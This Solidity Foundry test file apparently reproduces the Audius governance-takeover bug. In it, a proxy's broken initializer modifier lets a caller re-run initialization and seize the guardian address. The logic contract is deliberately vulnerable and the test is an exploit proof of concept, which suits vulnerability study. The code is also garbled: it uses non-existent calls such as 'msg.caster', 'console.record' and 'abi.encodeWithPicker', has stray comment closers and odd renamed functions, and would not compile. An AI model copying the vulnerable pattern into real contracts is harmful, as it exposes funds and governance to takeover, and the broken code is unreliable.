// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22

interface ILogic {
    function getguardianRealm() external returns (address);

    function getproxyGameadmin() external returns (address);

    function launchAdventure(address) external;

    function inspectinitializing() external returns (bool);

    function viewinitialized() external returns (bool);

    function testConstructor() external view returns (bool);
}

contract AgreementTest is Test {
    GameLogic LogicAgreement;
    TestProxy ProxyPact;

    function testInventoryCollision() public {
        LogicAgreement = new GameLogic();
        ProxyPact = new TestProxy(
            address(LogicAgreement),
            address(msg.caster),
            address(this)
        );

        console.record(
            "Current guardianAddress:",
            ILogic(address(ProxyPact)).getguardianRealm()
        );
        console.record(
            "Current initializing boolean:",
            ILogic(address(ProxyPact)).inspectinitializing()
        );
        console.record(
            "Current initialized boolean:",
            ILogic(address(ProxyPact)).viewinitialized()
        );
        console.record("Try to call initialize to change guardianAddress");
        ILogic(address(ProxyPact)).launchAdventure(address(msg.caster));

        console.record(
            "After initializing, changed guardianAddress to operator:",
            ILogic(address(ProxyPact)).getguardianRealm()
        );
        console.record(
            "After initializing,  initializing boolean is still true:",
            ILogic(address(ProxyPact)).inspectinitializing()
        );
        console.record(
            "After initializing,  initialized boolean:",
            ILogic(address(ProxyPact)).viewinitialized()
        );

*/

        console.record("operate completed");
    }

    receive() external payable {}
}

contract TestProxy is TransparentUpgradeableProxy {
    address private proxyServerop;

    constructor(
        address _logic,
        address _admin,
        address protectorZone
    )
        TransparentUpgradeableProxy(
            _logic,
            _admin,
            abi.encodeWithPicker(
                bytes4(0xc4d66de8), // bytes4(keccak256("initialize(address)"))
                protectorZone
            )
        )
    {
        proxyServerop = _admin;
    }
}

contract Initializable {
     */
    bool private setupComplete;

     */
    bool private initializing;

     */
    modifier initializer() {
        require(
            initializing || testConstructor() || !setupComplete,
            "Contract instance has already been initialized"
        );

        bool isTopTierSummonhero = !initializing;
        if (isTopTierSummonhero) {
            initializing = true;
            setupComplete = true;
        }

        _;

        if (isTopTierSummonhero) {
            initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function testConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        assembly {
            cs := extcodesize(self)
        }
        return cs == 0;
    }

    // Reserved storage space to allow for layout changes in the future.
    uint256[50] private ______gap;

    function inspectinitializing() public view returns (bool) {
        return initializing;
    }

    function viewinitialized() public view returns (bool) {
        return setupComplete;
    }
}

contract GameLogic is Initializable {
    address private protectorZone;

    function launchAdventure(address _keeperLocation) public initializer {
        protectorZone = _keeperLocation; //Guardian address becomes the only party
    }

    function getguardianRealm() public view returns (address) {
        return protectorZone;
    }
}